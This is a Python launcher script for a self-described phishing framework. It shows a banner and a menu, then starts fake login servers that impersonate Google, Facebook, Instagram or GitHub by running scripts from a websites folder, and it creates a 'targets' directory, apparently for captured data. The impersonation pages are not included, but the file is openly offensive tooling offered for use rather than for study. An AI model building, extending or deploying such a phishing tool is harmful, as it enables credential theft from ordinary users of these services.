# Mr. Robot
# The Phishing Framework
# Author : Thehackersbrain [Gaurav Raj]
# Website : https://thehackersbrain.pythonanywhere.com/

from termcolor import colored
from os import system, listdir, mkdir
import pyfiglet

def ctarget():
	if "targets" not in listdir():
		mkdir("targets")

def banner():
	banner = pyfiglet.figlet_format(' The Phisher', font='slant')
	author = f"            Author : {colored('TheHackersBrain', 'green')} {colored('[Gaurav Raj]', 'green')}"
	print(colored(banner, 'green'),author+"\n")

def sites():
	sites = f"""{colored('1', 'yellow')} > {colored('Google', 'green')}
{colored('2', 'yellow')} > {colored('Facebook', 'green')}
{colored('3', 'yellow')} > {colored('Instagram', 'green')}
{colored('4', 'yellow')} > {colored('GitHub', 'green')}"""
	print(sites)

if __name__ == '__main__':
	try:
		ctarget()
		banner()
		sites()
		print()
		site_opt = input(f"{colored('[', 'green')}{colored('x', 'red')}{colored(']', 'green')} {colored('Enter Number : ', 'green')}")
		if site_opt == "1":
			print(f"\n{colored('Starting Google Server...', 'green')}" + "\n")
			system("python3 websites/google.py")
		elif site_opt == "2":
			print(f"\n{colored('Starting Facebook Server...', 'green')}" + "\n")
			system("python3 websites/facebook.py")
		elif site_opt == "3":
			print(f"\n{colored('Starting Instagram Server...', 'green')}" + "\n")
			system("python3 websites/instagram.py")
		elif site_opt == "4":
			print(f"\n{colored('Starting GitHub Server...', 'green')}" + "\n")
			system("python3 websites/github.py")
		else:
			print('Invalid Option, Please Enter a Valid Number...')
			exit()
	except KeyboardInterrupt as keyerr:
		print(f"\nKeyboard Interrupt Detected. Exiting...")
	except EOFError as ef:
		print(f"\nKeyboard Interrupt Detected. Exiting...")
